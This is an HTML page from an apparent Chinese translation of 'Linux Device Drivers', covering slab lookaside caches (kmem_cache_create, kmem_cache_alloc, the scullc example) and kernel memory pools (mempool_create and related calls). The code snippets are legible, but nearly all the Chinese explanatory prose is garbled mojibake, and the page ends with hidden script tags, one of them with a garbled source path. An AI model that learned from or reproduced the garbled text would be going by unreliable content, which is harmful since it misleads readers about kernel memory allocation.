<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>8.2.&#160;󱸻-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch08.html" title="&#160;8&#160;&#160;ڴ">
<link rel="prev" href="ch08.html" title="&#160;8&#160;&#160;ڴ">
<link rel="next" href="ch08s03.html" title="8.3.&#160;get_free_page ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">8.2.&#160;󱸻</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch08.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;8&#160;&#160;ڴ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch08s03.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="LookasideCaches.sect"></a>8.2.&#160;󱸻</h2></div></div></div>
<p>һ豸ԷͬСĶ. ںѾάһͬСڴ, ΪʲôһЩڴظЩĶ? ʵ, ںȷʵʵһʩڴ, Ϊһ󱸻. 豸չʾڴΪ, ֤ʹһ󱸻ǶԵ, , ;  Linux 2.6  USB  SCSI ʹû.</p>
<p>Linux ں˵ĻʱΪ" slab ". , Ĺܺ &lt;linux/slab.h&gt; . slab ʵһ kmem_cache_t ͵Ļ; ʹһ kmem_cache_create ĵ:</p>
<pre class="programlisting">
kmem_cache_t *kmem_cache_create(const char *name, size_t size,
 size_t offset,
 unsigned long flags,
 void (*constructor)(void *, kmem_cache_t *,
 unsigned long flags), void (*destructor)(void *, kmem_cache_t *, unsigned long flags)); 
</pre>
<p>һµĿפĿȫͬСڴĻ, С size ָ. name Ϊһ׷ʱõĹϢ; ͨ, ΪĽṹ͵. 汣һָ name ָ, ǿ, Ӧһָھ̬洢еӵָ(ֻһִ). Ӳܰո.</p>
<p>offset ҳڵĵһƫ; ɱȷһԱĶ, ܻʹ 0 ȱʡֵ. flags νз䲢б־һλ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>SLAB_NO_REAP </span></span></dt>
<dd><p>־ϵͳڴʱ. ־ͨǸ; ҪǱⲻҪڴж.</p></dd>
<dt><span class="term"><span>SLAB_HWCACHE_ALIGN </span></span></dt>
<dd><p>־Ҫÿݶ󱻶뵽һ; ʵʶƽ̨Ļֲ. ѡһõѡ,  SMP ĻƵȡ. , ûж˷ѿɹ۵ڴ.</p></dd>
<dt><span class="term"><span>SLAB_CACHE_DMA </span></span></dt>
<dd><p>־Ҫÿݶ DMA ڴ.</p></dd>
</dl></div>
<p>һױ־Ի;  mm/slab.c. , , ϵͳ, Щ־ͨһںѡȫԵ</p>
<p> constructor  destructor ǿѡ( ǿû destructor, û constructor ); ǰ߿ʼ·Ķ, ߿""ǵڴ汻ΪһͷŻظϵͳ֮ǰ.</p>
<p>캯, мס. һ캯ڷһϵжڴʱ; Ϊڴܳм, 캯ܱε. 㲻ܼ蹹캯ΪһһĽ. ͬ, Ժĳδ֪ʱе, һͷź. ͹캯ܻ򲻿ܱ˯, Ƿ񱻴 SLAB_CTOR_ATOMIC ־( CTOR  constructor д).</p>
<p>Ϊ, һԱʹͬĺ͹캯; slab  SLAB_CTOR_CONSTRUCTOR ־һ캯.</p>
<p>һһĻ汻, ͨ kmem_cache_alloc .</p>
<pre class="programlisting">
void *kmem_cache_alloc(kmem_cache_t *cache, int flags);
</pre>
<p>, cache ֮ǰѾĻ; flags ᴫݸ kmalloc ͬ, ұο kmem_cache_alloc Ҫȥڴ.</p>
<p>Ϊͷһ, ʹ kmem_cache_free:</p>
<pre class="programlisting">
 void kmem_cache_free(kmem_cache_t *cache, const void *obj); 
</pre>
<p>, ͵صģ鱻ж, ӦͷĻ:</p>
<pre class="programlisting">
 int kmem_cache_destroy(kmem_cache_t *cache); 
</pre>
<p>ٲֻڴзеĶѷظʱųɹ. , һģӦ kmem_cache_destroy ķֵ; һʧָʾĳģеڴй©(ΪĳЩѱʧ.)</p>
<p>ʹú󱸻һ洦ںάʹõͳ. Щͳƿɴ /proc/slabinfo .</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AscullBasedontheSlabCachesscullc.sect"></a>8.2.1.&#160;һ Slab  scull: scullc</h3></div></div></div>
<p>ʱ. scullc һ򻯵 scull ģİ汾, ֻʵֿ豸 -- õڴ.  scull, ʹ kmalloc, scullc ʹڴ滺. ӵĴСڱʱͼʱ޸, ǲʱ -- Ҫһڴ, ǲ봦ЩҪϸ.</p>
<p>scullc ʹһ,  slab .  scull ֻڼд. , ǱԼ slab :</p>
<pre class="programlisting">
/* declare one cache pointer: use it for all devices */
kmem_cache_t *scullc_cache;
</pre>
<p>slab Ĵķʽ( ģʱ ):</p>
<pre class="programlisting">
/* scullc_init: create a cache for our quanta */
scullc_cache = kmem_cache_create("scullc", scullc_quantum,
                                 0, SLAB_HWCACHE_ALIGN, NULL, NULL); /* no ctor/dtor */

if (!scullc_cache)
{
        scullc_cleanup();
        return -ENOMEM;

}
</pre>
<p>ηڴ:</p>
<pre class="programlisting">
/* Allocate a quantum using the memory cache */
if (!dptr-&gt;data[s_pos])
{
        dptr-&gt;data[s_pos] = kmem_cache_alloc(scullc_cache, GFP_KERNEL);
        if (!dptr-&gt;data[s_pos])

                goto nomem;
        memset(dptr-&gt;data[s_pos], 0, scullc_quantum);
}
</pre>
<p>Щͷڴ:</p>
<pre class="programlisting">
for (i = 0; i &lt; qset; i++)
        if (dptr-&gt;data[i])
                kmem_cache_free(scullc_cache, dptr-&gt;data[i]);
</pre>
<p>, ģжʱ, ǲòػϵͳ:</p>
<pre class="programlisting">
/* scullc_cleanup: release the cache of our quanta */
if (scullc_cache)
        kmem_cache_destroy(scullc_cache);
</pre>
<p> scull  scullc ҪͬԵٶԼõڴʹ. ΪӴһǡǺʴСڴƬĳз, ڴеǾܼܵ,  scull ӵ෴, һԤڴƬ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="MemoryPools.sect"></a>8.2.2.&#160;ڴ</h3></div></div></div>
<p>ںвٵطڴ䲻ʧ. ΪһЩȷķʽ, ں˿ߴһ֪Ϊڴ( "mempool" )ĳ. һڴʵֻһ󱸻, һֱһڴбʱʹ.</p>
<p>һڴһ mempool_t (  &lt;linux/mempool.h&gt; ж); ʹ mempool_create һ:</p>
<pre class="programlisting">
mempool_t *mempool_create(int min_nr,
 mempool_alloc_t *alloc_fn,
 mempool_free_t *free_fn,
 void *pool_data); 
</pre>
<p>min_nr ڴӦһֱСķĶ. ʵʵķͷŶ alloc_fn  free_fn , Щԭ:</p>
<pre class="programlisting">
typedef void *(mempool_alloc_t)(int gfp_mask, void *pool_data);
typedef void (mempool_free_t)(void *element, void *pool_data);
</pre>
<p> mempool_create Ĳ ( pool_data ) ݸ alloc_fn  free_fn.</p>
<p>Ҫ, ɱд;ĺ mempool ڴ. , , ֻҪʹں slab Ϊ㴦.  2  ( mempool_alloc_slab  mempool_free_slab) ڴطԭͺ kmem_cache_alloc  kmem_cache_free ֮ĸӦ. , ڴصĴ볣:</p>
<pre class="programlisting">
cache = kmem_cache_create(. . .); 
pool = mempool_create(MY_POOL_MINIMUM,mempool_alloc_slab, mempool_free_slab, cache); 
</pre>
<p>һѴڴ, ԷͷŶ,ʹ:</p>
<pre class="programlisting">
void *mempool_alloc(mempool_t *pool, int gfp_mask);
void mempool_free(void *element, mempool_t *pool);
</pre>
<p>ڴش, 亯㹻ĴһԤȷĶ. ,  mempool_alloc ĵͼӷ亯Ķ; Ǹʧ, һԤȷĶ(ʣµ). һ mempool_free ͷ, ڳ, ԤĶĿСС; , ظϵͳ.</p>
<p>һ mempool ɱ¶С, ʹ:</p>
<pre class="programlisting">
int mempool_resize(mempool_t *pool, int new_min_nr, int gfp_mask);
</pre>
<p>, ɹ, ڴصĴС new_min_nr . 㲻Ҫһڴ, ظϵͳʹ:</p>
<pre class="programlisting">
void mempool_destroy(mempool_t *pool); 
</pre>
<p>деķĶ,  mempool ֮ǰ, һں oops.</p>
<p>㿼ʹһ mempool, סһ: mempools һڴһ, κʵʹǿкõ. ʹ mempools Ĵڴ. ڼÿ, ѡĿѡǲʹ mempool ҴԼ򵥴ʧܵĿ. κηԲΣϵͳԵķʽӦһʧ, . е mempools ʹӦ.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch08.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch08.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch08s03.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">&#160;8&#160;&#160;ڴ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;8.3.&#160;get_free_page </td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>